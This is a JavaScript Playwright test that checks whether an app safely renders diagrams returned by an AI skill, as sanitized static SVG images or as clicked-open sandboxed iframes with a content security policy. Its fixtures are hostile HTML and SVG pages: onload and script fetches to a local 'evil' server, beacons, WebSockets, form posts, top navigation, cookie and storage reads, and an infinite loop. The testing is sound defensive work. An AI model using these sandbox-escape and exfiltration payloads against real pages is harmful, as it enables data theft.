// Real-browser check for skill diagrams (plan 2.6), static-image design. A skill's reply is the least trusted thing in the app, so this proves what the
// browser does. (A) A page with a drawing becomes a still image: an <img> of the saved, sanitized svg, no iframe anywhere, no request leaves. (B) A page
// with no drawing is a fallback: nothing is loaded or run until the click on "Show interactive version"; then the sandboxed iframe (no allow-same-origin,
// CSP in header and document) runs a hostile document that reaches nothing. (C) A while(true){} page is never fetched or run unclicked and does not freeze
// the app. (D) Try with Built-in. A local "evil" server that every attempt points at must see ZERO requests; a control shows it would see them.
// Fake provider only; synthetic note. Run after `vite build`: BATCH2A_OUTPUT=<folder outside the repo> node check/skill-diagram.mjs
import assert from 'node:assert/strict';
import http from 'node:http';
import { mkdtemp, mkdir, writeFile, readdir, readFile, rm } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { chromium } from 'playwright-core';
import { Store } from '../server/store.ts';
import { NoteWatcher } from '../server/watch.ts';
import { createApp } from '../server/http.ts';
import {DiagramImageStore} from '../server/diagram-image-store.ts';
import { SKILL_DIAGRAM_CSP, SKILL_DIAGRAM_SVG_CSP_HEADER, SVG_ISSUE_TEXT } from '../shared/skill-diagram.ts';
import { cicd } from '../test/fixtures/diagrams.ts';

const out = path.resolve(process.env.BATCH2A_OUTPUT ?? '');
assert(process.env.BATCH2A_OUTPUT && !out.toLowerCase().startsWith(path.resolve('..').toLowerCase()), 'Output must be outside the repo');
const root = await mkdtemp(path.join(os.tmpdir(), 'aitiarch-skill-diagram-ui-')), skills = await mkdtemp(path.join(os.tmpdir(), 'aitiarch-skill-diagram-lib-'));
execFileSync('git', ['init', '-q'], { cwd: root });
await writeFile(path.join(root, '.gitignore'), '/.cache/\n/ui-state.json*\n');
const text = '# Invented release\n\nThe app builds once, runs tests and security checks in parallel, then releases only if both pass.\n\nEnd of synthetic note.\n';
await writeFile(path.join(root, 'fixture.md'), Buffer.from('\ufeff' + text.replace(/\n/g, '\r\n')));
await mkdir(path.join(skills, 'diagram-design')); await writeFile(path.join(skills, 'diagram-design', 'SKILL.md'), '---\nname: diagram-design\ndescription: Draw diagrams as web pages\n---\nUse boxes and arrows.\n');

const hits = []; const evil = http.createServer((req, res) => { hits.push(req.method + ' ' + req.url); res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('x'); });
await new Promise((r) => evil.listen(0, '127.0.0.1', r));
const EVIL = 'http://127.0.0.1:' + evil.address().port;
// (A) A page with a script outside the drawing, and a drawing full of tricks.
const SVG_PAGE = `<!doctype html><html><head><style>:root{--bg:#f4efe6;--ink:#1c1b19} body{background:var(--bg)} .n{fill:var(--bg);stroke:var(--ink);stroke-width:2}</style>
<script>fetch('${EVIL}/page-script')</script></head><body onload="fetch('${EVIL}/body-onload')">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 120" width="300" height="120" onload="fetch('${EVIL}/svg-onload')"><script>fetch('${EVIL}/svg-script')</script>
<image href="${EVIL}/image" width="9" height="9"/><foreignObject width="9" height="9"><iframe xmlns="http://www.w3.org/1999/xhtml" src="${EVIL}/iframe"></iframe></foreignObject>
<a href="javascript:alert(1)"><rect class="n" x="20" y="20" width="120" height="60" rx="6" onclick="fetch('${EVIL}/click')"/></a><text x="30" y="55">HOSTILE SVG</text></svg></body></html>`;
// (B) No drawing at all, only a page whose script tries every way out.
const HOSTILE = `<!doctype html><html><head><title>HOSTILE DIAGRAM</title>
<style>@import url(${EVIL}/css-import); body{font-family:system-ui;background:#222;color:#eee} .bg{background:url(${EVIL}/css-bg)}</style>
<link rel="stylesheet" href="${EVIL}/sheet.css"><link rel="prefetch" href="${EVIL}/prefetch"></head>
<body class="bg"><h1>HOSTILE DIAGRAM</h1><img src="${EVIL}/img-tag"><iframe src="${EVIL}/iframe-tag"></iframe>
<form id="f" action="${EVIL}/form" method="post"><input name="a" value="1"></form>
<script>
const E=${JSON.stringify(EVIL)},r={},v=[];document.addEventListener('securitypolicyviolation',e=>v.push(e.violatedDirective));
const tryit=async(k,f)=>{try{r[k]=await f();}catch(e){r[k]='threw:'+e.name;}};
(async()=>{
 await tryit('alive',()=>true);
 await tryit('fetch',async()=>{await fetch(E+'/fetch');return 'resolved';});
 await tryit('xhr',()=>new Promise(res=>{const x=new XMLHttpRequest();x.open('GET',E+'/xhr');x.onload=()=>res('loaded');x.onerror=()=>res('error');x.send();}));
 await tryit('image',()=>new Promise(res=>{const i=new Image();i.onload=()=>res('loaded');i.onerror=()=>res('error');i.src=E+'/img-js';}));
 await tryit('beacon',()=>String(navigator.sendBeacon(E+'/beacon','x')));
 await tryit('websocket',()=>new Promise(res=>{try{const w=new WebSocket(E.replace('http','ws')+'/ws');w.onopen=()=>res('open');w.onerror=()=>res('error');}catch(e){res('threw:'+e.name);}}));
 await tryit('form',()=>{document.getElementById('f').submit();return 'called';});
 await tryit('top',()=>{top.location.href=E+'/top';return 'called';});
 await tryit('open',()=>String(window.open(E+'/open')));
 await tryit('cookie',()=>document.cookie);
 await tryit('storage',()=>String(localStorage.length));
 await tryit('parentDoc',()=>String(parent.document.title));
 await new Promise(x=>setTimeout(x,300));
 parent.postMessage({skillReport:true,r,violations:v.length,meta:!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')},'*');
 setTimeout(()=>{location.href=E+'/self-navigate';},100);
})();
</script></body></html>`;
// (C) A page that would freeze whatever runs it.
const LOOP = '<!doctype html><html><body><h1>LOOP</h1><script>window.parent.postMessage({skillReport:true,loop:true},"*");while(true){}</script></body></html>';

const store = await Store.open(root), watcher = new NoteWatcher(store, 60, 10); await watcher.start();
const calls = []; let mode = 'svg';
const provider = { name: 'claude', checkAvailability: async () => ({ available: true }),
  invoke: async (r) => { calls.push({ render: r.render ?? 'builtin', skills: r.skills?.loaded?.map((s) => s.name) ?? [] });
    const doc = { svg: SVG_PAGE, hostile: HOSTILE, loop: LOOP }[mode];
    return { id: r.id, provider: 'claude', model: null, answer: r.render === 'skill' ? 'Here is the page:\n```html\n' + doc + '\n```' : 'Synthetic text answer.', claims: [], usage: null, ...(r.render === 'skill' ? {} : { diagram: cicd }) }; } };
const app = createApp({ store, watcher, distDir: path.resolve('dist'), provider, skillRoots: [{ kind: 'user', dir: skills, layout: 'flat' }] });
let browser; const errors = [], report = {};
try {
  const base = 'http://127.0.0.1:' + await app.listen(0);
  browser = await chromium.launch({ channel: 'msedge', headless: true });
  // Control: the hostile page in a sandboxed iframe WITHOUT the CSP does reach the evil server, so zero hits below means something.
  const plain = http.createServer((req, res) => { res.writeHead(200, { 'content-type': 'text/html' }); res.end(req.url === '/doc' ? HOSTILE : '<iframe sandbox="allow-scripts" src="/doc"></iframe>'); });
  await new Promise((r) => plain.listen(0, '127.0.0.1', r));
  const controlPage = await browser.newPage(); await controlPage.goto('http://127.0.0.1:' + plain.address().port + '/'); await controlPage.waitForTimeout(2500);
  report.controlHits = hits.length; assert(hits.length > 0, 'control: without the CSP the hostile page reaches the evil server'); hits.length = 0; await controlPage.close(); plain.close();
  const context = await browser.newContext({ viewport: { width: 1600, height: 1000 } }), page = await context.newPage();
  page.setDefaultTimeout(15000);
  const popups = []; context.on('page', (p) => { if (p !== page) popups.push(p.url()); });
  const responses = []; page.on('response', async (r) => { if (r.url().includes('/api/skill-diagram')) responses.push({ url: r.url(), status: r.status(), headers: await r.allHeaders() }); });
  page.on('pageerror', (e) => errors.push(e.message));
  await page.goto(base + '/?debug'); await page.waitForFunction(() => window.__aitiarch?.['fixture.md']);
  await page.evaluate(() => { window.__skillMessages = []; window.addEventListener('message', (e) => { if (e.data?.skillReport) window.__skillMessages.push({ data: e.data, origin: e.origin }); }); });
  const select = (a, b) => page.evaluate(([a, b]) => { const v = window.__aitiarch['fixture.md'].view; v.dispatch({ selection: { anchor: a, head: b } }); v.focus(); }, [a, b]);
  const from = text.indexOf('The app'), to = text.indexOf('\n\nEnd');
  const openVisualize = async () => { await select(from, to); const toolbar = page.locator('.cm-sel-toolbar'); await toolbar.waitFor(); await toolbar.getByRole('button', { name: 'Visualize' }).click(); const review = page.locator('.invocation-review'); await review.waitFor(); return review; };
  const skillItems = () => page.evaluate(async () => (await (await fetch('/api/ink?path=fixture.md')).json()).document.items.filter((i) => i.skillDiagram));
  // A plain poll: waitForFunction does not wait on an async predicate.
  const until = async (what, test, ms = 15000) => { const end = Date.now() + ms; while (Date.now() < end) { if (await test()) return; await new Promise((r) => setTimeout(r, 100)); } throw new Error('timed out waiting for ' + what); };
  const completeSkillItems = async () => (await skillItems()).filter((i) => i.generation.status === 'complete').length;
  const runSkill = async (m, already) => {
    mode = m; const review = await openVisualize(); await review.getByRole('button', { name: /^Send to/ }).waitFor();
    if (!(await review.getByRole('radio', { name: 'Skill' }).isChecked())) { await review.getByRole('radio', { name: 'Skill' }).check(); await review.getByRole('button', { name: /^Send to/ }).waitFor(); }
    await review.getByRole('button', { name: /^Send to/ }).click();
    await until('the skill diagram to be saved', async () => (await completeSkillItems()) >= already + 1);
    const item = (await skillItems()).at(-1); const host = page.locator(`[data-skill-asset="${item.skillDiagram.asset}"]`); await host.waitFor(); return { item, host };
  };
  const responsive = () => page.evaluate(() => new Promise((resolve) => { let frames = 0; const t = performance.now(); const tick = () => { frames++; if (performance.now() - t > 500) resolve(frames); else requestAnimationFrame(tick); }; requestAnimationFrame(tick); }));

  // 1. With no skill attached to Visualize, Skill is offered but disabled and says how to enable it. Built-in is the default.
  let review = await openVisualize(); await review.getByRole('button', { name: /^Send to/ }).waitFor();
  assert.equal(await review.getByRole('radio', { name: 'Built-in' }).isChecked(), true, 'Built-in is the default');
  assert.equal(await review.getByRole('radio', { name: 'Skill' }).isDisabled(), true, 'Skill is disabled until a skill is attached');
  assert.match(await review.locator('#renderer-line').innerText(), /attach one to Visualize in Settings/); assert.equal(calls.length, 0, 'no provider call yet');
  await review.getByRole('button', { name: 'Cancel preview' }).click(); await review.waitFor({ state: 'detached' });
  const attach = await page.evaluate(async () => { const lib = await (await fetch('/api/skills?q=diagram-design&limit=50')).json(), id = lib.results.find((s) => s.name === 'diagram-design').id;
    const nodes = (await (await fetch('/api/nodes')).json()).nodes;
    return (await fetch('/api/nodes', { method: 'PUT', headers: { 'content-type': 'application/json', 'x-aitiarch': '1' }, body: JSON.stringify({ visualize: { persona: nodes.visualize.persona, skills: [id] } }) })).status; });
  assert.equal(attach, 200);

  // A. A page with a drawing: shown as a still image. No iframe, nothing leaves.
  review = await openVisualize(); await review.getByRole('button', { name: /^Send to/ }).waitFor();
  assert.equal(await review.getByRole('radio', { name: 'Skill' }).isDisabled(), false); await review.getByRole('radio', { name: 'Skill' }).check(); await review.getByRole('button', { name: /^Send to/ }).waitFor();
  assert.match(await review.locator('#renderer-line').innerText(), /still image/); await review.locator('summary', { hasText: 'What will be sent' }).click();
  assert.match(await review.locator('.what-is-sent').innerText(), /diagram-design/); assert.equal(calls.length, 0, 'still no call before Send');
  await review.getByRole('button', { name: /^Send to/ }).click();
  await until('the first skill diagram to be saved', async () => (await completeSkillItems()) >= 1);
  const summary = () => page.evaluate(async () => (await (await fetch('/api/ink?path=fixture.md')).json()).document.items.map((i) => ({ id: i.id.slice(0, 8), skill: i.skillDiagram?.asset?.slice(-8), issue: i.diagramIssue, status: i.generation?.status, body: i.body.slice(0, 60) })));
  const a = (await skillItems()).at(-1); assert(a, 'a skill diagram was saved: ' + JSON.stringify(await summary())); const hostA = page.locator(`[data-skill-asset="${a.skillDiagram.asset}"]`); await hostA.waitFor();
  assert.deepEqual(calls, [{ render: 'skill', skills: ['diagram-design'] }]); assert.match(a.skillDiagram.asset, /^diagram-[a-f0-9]{64}\.svg$/); assert.equal(a.skillDiagram.why, undefined);
  const img = hostA.locator('img.skill-diagram-image'); await img.waitFor();
  report.imgSrc = await img.getAttribute('src'); assert.match(report.imgSrc, /^\/api\/skill-diagram\?name=diagram-[a-f0-9]{64}\.svg$/);
  assert.equal(await img.evaluate(async (i) => { await i.decode(); return i.naturalWidth; }), 300, 'the sanitized svg loads as an image at its own size');
  assert.equal(await page.locator('iframe').count(), 0, 'no iframe anywhere on the page'); assert.equal(await hostA.locator('svg').count(), 0, 'and the drawing is not inline either');
  assert(!(await page.locator('body').innerText()).includes('HOSTILE SVG'), 'the text of the drawing is only inside the image'); assert.equal(await page.evaluate(() => document.documentElement.outerHTML.includes('HOSTILE')), false);
  // One caption only: the card's own text says "Diagram drawn by the diagram-design skill. It is shown as a static image."; the frame adds none for a still image.
  assert.equal(await hostA.locator('.diagram-caption').count(), 0, 'no second caption under a still image'); assert.doesNotMatch(await hostA.innerText(), /Shown as a still image/);
  assert.equal(await hostA.locator('xpath=ancestor::article[contains(@class,"margin-card")]').innerText().then((t) => t.split('Diagram drawn by the diagram-design skill').length - 1), 1, 'the sentence appears once in the card');
  const svgResponse = responses.find((r) => r.url.includes(a.skillDiagram.asset)); assert(svgResponse, 'the image was fetched'); report.svgHeaders = { type: svgResponse.headers['content-type'], csp: svgResponse.headers['content-security-policy'] };
  assert.equal(svgResponse.headers['content-type'], 'image/svg+xml'); assert.equal(svgResponse.headers['content-security-policy'], SKILL_DIAGRAM_SVG_CSP_HEADER); assert.equal(svgResponse.headers['x-content-type-options'], 'nosniff');
  await page.waitForTimeout(1500); assert.deepEqual(hits, [], 'as an image: the evil server saw nothing: ' + hits.join(', '));
  const savedSvg = await readFile(path.join(root, 'assets', a.skillDiagram.asset), 'utf8');
  assert.match(savedSvg, /<text x="30" y="55">HOSTILE SVG<\/text>/, 'the drawing itself is kept'); assert.doesNotMatch(savedSvg, /script|onload|onclick|image|foreignObject|iframe|href|evil|127\.0\.0\.1/i, 'and none of the tricks');
  assert.deepEqual(a.generation.skills, ['diagram-design'], 'the thought records the skill'); assert.equal(a.body, 'Diagram drawn by the diagram-design skill. It is shown as a static image.');
  await hostA.screenshot({ path: path.join(out, 'skill-diagram-image.png') });
  await hostA.getByRole('button', { name: 'See it larger' }).click(); const bigImg = page.locator('dialog.skill-diagram-large img'); await bigImg.waitFor();
  assert.equal(await page.locator('dialog.skill-diagram-large iframe').count(), 0); await page.screenshot({ path: path.join(out, 'skill-diagram-large.png') }); await page.getByRole('button', { name: 'Close larger diagram' }).click();

  // D. Try with Built-in: a normal reviewable request for the same selection with Built-in chosen. Nothing is sent until Send.
  await hostA.getByRole('button', { name: 'Try with Built-in' }).click(); const again = page.locator('.invocation-review'); await again.waitFor();
  assert.equal(await again.getAttribute('data-frozen-selection'), text.slice(from, to), 'the same selection is frozen again'); await again.getByRole('button', { name: /^Send to/ }).waitFor();
  assert.equal(await again.getByRole('radio', { name: 'Built-in' }).isChecked(), true); assert.equal(await again.getByRole('radio', { name: 'Skill' }).isDisabled(), false); assert.equal(calls.length, 1, 'no second call before Send');
  await again.getByRole('button', { name: /^Send to/ }).click(); await page.locator('.margin-card.thought-blob svg').first().waitFor();
  assert.deepEqual(calls.at(-1), { render: 'builtin', skills: [] }, 'Built-in carries no skills: attached skills are used only with the Skill renderer'); assert.equal(await page.locator(`[data-skill-asset="${a.skillDiagram.asset}"] img`).count(), 1, 'the skill image is still there');

  // E. Add to note: the still image goes into the note as one markdown image line, in the note's own BOM and CRLF, shown in the editor as an image; one Undo removes it.
  const original = Buffer.from('\ufeff' + text.replace(/\n/g, '\r\n')), notePath = path.join(root, 'fixture.md');
  const cardOf = (host) => host.locator('xpath=ancestor::*[contains(@class,"margin-card")][1]');
  await cardOf(hostA).getByRole('button', { name: 'Add to note' }).click();
  await until('the note to be saved with the image', async () => (await readFile(notePath)).includes(Buffer.from(a.skillDiagram.asset)));
  const added = await readFile(notePath); report.noteHasBom = added.subarray(0, 3).equals(Buffer.from([0xef, 0xbb, 0xbf]));
  assert(report.noteHasBom, 'the BOM is still there'); const addedText = added.toString('utf8');
  assert.equal(addedText.replace(/\r\n/g, '').includes('\n'), false, 'every line break is still CRLF'); assert.equal(addedText.replace(/\r\n/g, '').includes('\r'), false);
  assert.match(addedText, new RegExp(`> \\[!ai\\]\\r\\n> Diagram drawn by the diagram-design skill\\. It is shown as a static image\\.\\r\\n> !\\[AI diagram: diagram-design\\]\\(assets/${a.skillDiagram.asset}\\)`));
  assert(addedText.startsWith(original.toString('utf8').slice(0, original.toString('utf8').indexOf('The app')) ), 'text before the selection is untouched');
  const figure = page.locator('.cm-editor figure.cm-image img'); await figure.first().waitFor(); assert.match(await figure.first().getAttribute('src'), /^\/api\/skill-diagram\?name=diagram-[a-f0-9]{64}\.svg$/);
  assert.equal(await figure.first().evaluate(async (i) => { await i.decode(); return i.naturalWidth; }), 300, 'the editor shows the sanitized svg as an image');
  await page.waitForTimeout(1200); assert.deepEqual(hits, [], 'the evil server saw nothing from the editor either'); assert.equal(await page.locator('.cm-editor iframe').count(), 0);
  await page.screenshot({ path: path.join(out, 'skill-diagram-in-note.png') });
  await page.evaluate(() => { const v = window.__aitiarch['fixture.md'].view; v.focus(); }); await page.keyboard.press('Control+z');
  await until('Undo to restore the note', async () => (await readFile(notePath)).equals(original)); report.undoRestoresBytes = true;

  // B. A page with no drawing: a fallback. Nothing is requested or run until the click.
  const b = await runSkill('hostile', 1); report.fallback = b.item.skillDiagram;
  assert.match(b.item.skillDiagram.asset, /\.html$/); assert.equal(b.item.skillDiagram.why, 'svg_none'); assert.match(b.item.body, /could not be shown as an image/);
  assert.equal(await b.host.locator('iframe').count(), 0, 'no iframe before the click'); assert.equal(await b.host.locator('img').count(), 0);
  assert.match(await b.host.innerText(), new RegExp(SVG_ISSUE_TEXT.svg_none)); const toggle = b.host.getByRole('button', { name: 'Show interactive version' }); await toggle.waitFor();
  await page.waitForTimeout(1500);
  assert.equal(responses.filter((r) => r.url.includes(b.item.skillDiagram.asset)).length, 0, 'the page was not even requested before the click');
  assert.equal(await page.evaluate(() => window.__skillMessages.length), 0, 'nothing ran'); assert.deepEqual(hits, [], 'and the evil server saw nothing');
  await toggle.click(); const frame = b.host.locator('iframe'); await frame.waitFor();
  report.sandbox = await frame.getAttribute('sandbox'); assert.equal(report.sandbox, 'allow-scripts'); assert(!/same-origin|top-navigation|popups|forms|modals/.test(report.sandbox));
  assert.equal(await frame.getAttribute('srcdoc'), null); assert.match(await b.host.innerText(), /Interactive version of the diagram-design skill's page/);
  await page.waitForFunction(() => window.__skillMessages.some((m) => m.data.r));
  const htmlResponse = responses.find((r) => r.url.includes(b.item.skillDiagram.asset)); const csp = htmlResponse.headers['content-security-policy']; report.csp = csp;
  assert(csp.startsWith(SKILL_DIAGRAM_CSP)); assert.match(csp, /frame-ancestors 'self'/);
  const doc = await page.evaluate(async (u) => (await fetch(u)).text(), htmlResponse.url); assert(doc.startsWith('<!doctype html><meta http-equiv="Content-Security-Policy" content="' + SKILL_DIAGRAM_CSP));
  const msg = await page.evaluate(() => window.__skillMessages.find((m) => m.data.r)); const r = msg.data.r; report.attempts = r;
  assert.equal(msg.origin, 'null', 'opaque origin'); assert.equal(r.alive, true); assert.equal(msg.data.meta, true); assert(msg.data.violations > 0);
  assert.match(r.fetch, /^threw:/); assert.notEqual(r.xhr, 'loaded'); assert.equal(r.image, 'error'); assert.notEqual(r.websocket, 'open'); assert.match(r.top, /^threw:SecurityError/); assert.equal(r.open, 'null');
  assert.match(r.cookie, /^threw:SecurityError/); assert.match(r.storage, /^threw:SecurityError/); assert.match(r.parentDoc, /^threw:SecurityError/);
  await page.waitForTimeout(2000); assert.deepEqual(hits, [], 'even after the click, the evil server saw nothing: ' + hits.join(', ')); assert.deepEqual(popups, []); assert(page.url().startsWith(base));
  await b.host.screenshot({ path: path.join(out, 'skill-diagram-fallback.png') });
  await b.host.getByRole('button', { name: 'Hide interactive version' }).click(); assert.equal(await b.host.locator('iframe').count(), 0, 'Hide removes the iframe');

  // F. Add the fallback to the note: a link to the saved page. In the editor it is a control only; no iframe and no request until the click.
  await cardOf(b.host).getByRole('button', { name: 'Add to note' }).click();
  await until('the note to be saved with the link', async () => (await readFile(notePath)).includes(Buffer.from(b.item.skillDiagram.asset)));
  const linked = (await readFile(notePath)).toString('utf8'); assert.match(linked, new RegExp(`> \\[AI diagram, interactive version: diagram-design\\]\\(assets/${b.item.skillDiagram.asset}\\)\\r\\n`));
  assert(!linked.includes(`![AI diagram, interactive`), 'a link, not an image'); const control = page.locator('.cm-editor .cm-skill-page').first(); await control.waitFor();
  const before = responses.filter((r2) => r2.url.includes(b.item.skillDiagram.asset)).length;
  assert.equal(await page.locator('.cm-editor iframe').count(), 0, 'no iframe in the editor before the click'); await page.waitForTimeout(1000);
  assert.equal(responses.filter((r2) => r2.url.includes(b.item.skillDiagram.asset)).length, before, 'and the page is not requested for the editor either');
  await control.getByRole('button', { name: 'Show interactive version' }).click(); const live = page.locator('.cm-editor .cm-skill-page iframe'); await live.waitFor();
  assert.equal(await live.getAttribute('sandbox'), 'allow-scripts'); await control.getByRole('button', { name: 'Hide interactive version' }).click(); assert.equal(await page.locator('.cm-editor iframe').count(), 0);
  await page.evaluate(() => { window.__aitiarch['fixture.md'].view.focus(); }); await page.keyboard.press('Control+z'); await until('Undo to restore the note', async () => (await readFile(notePath)).equals(original));
  await page.waitForTimeout(1500); assert.deepEqual(hits, [], 'the evil server still saw nothing');

  // C. A while(true){} page: never fetched, never run, and the app stays responsive. (It is not clicked: a user who clicks gets what they asked for.)
  const c = await runSkill('loop', 2); assert.match(c.item.skillDiagram.asset, /\.html$/);
  assert.equal(await c.host.locator('iframe').count(), 0); const t0 = Date.now(); const alive = await page.evaluate(() => 1); assert(Date.now() - t0 < 1000, 'the page answers at once');
  const frames = await responsive(); report.framesWhileLoopHidden = frames; assert(frames > 10, 'the app keeps painting: ' + frames);
  await page.waitForTimeout(1500); assert.equal(responses.filter((r2) => r2.url.includes(c.item.skillDiagram.asset)).length, 0, 'the loop page was never requested');
  assert.equal(await page.evaluate(() => window.__skillMessages.filter((m) => m.data.loop).length), 0, 'and never ran'); assert((await responsive()) > 10); assert.equal(alive, 1);

  const files = (await readdir(path.join(root, 'assets'))).sort();
  assert.deepEqual(files,[a.skillDiagram.asset,a.skillDiagram.asset.replace(/\.svg$/,'.png'),b.item.skillDiagram.asset,c.item.skillDiagram.asset].sort(),'one sanitized svg, its cached PNG and exactly two HTML fallbacks');
  const cached=await new DiagramImageStore(root).read(a.skillDiagram.asset.replace(/\.svg$/,'.png'));assert(cached.length>0,'the generated PNG is validated, not merely counted');
  assert.equal(await readFile(path.join(root, 'fixture.md'), 'utf8'), '\ufeff' + text.replace(/\n/g, '\r\n'), 'the note is untouched'); assert.deepEqual(errors, [], 'no page errors');
  console.log(JSON.stringify({ passed: true, ...report }, null, 1));
} finally { await browser?.close(); evil.close(); watcher.stop(); await app.close(); await rm(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 }); await rm(skills, { recursive: true, force: true }); }
